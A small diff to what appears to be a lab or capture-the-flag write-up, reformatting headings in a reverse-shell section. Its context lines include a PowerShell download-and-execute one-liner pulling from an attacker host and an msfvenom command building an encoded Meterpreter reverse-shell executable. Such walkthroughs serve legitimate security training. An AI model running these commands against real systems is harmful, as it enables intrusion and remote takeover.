@@ -98,7 +98,6 @@ Credentials: `admin:admin`
 
 ### Setup Reverse Shell
 
-
 ```sh
 # attack box
 
@@ -130,12 +129,10 @@ POWERSHELL iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP:80
 type C:\Users\bruce\Desktop\user.txt
 ```
 
-
-### Meterpreter Shell
+### Setup Meterpreter Shell
 
 ```sh
 # attacker
-
 
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f exe -o enki.exe
 ```
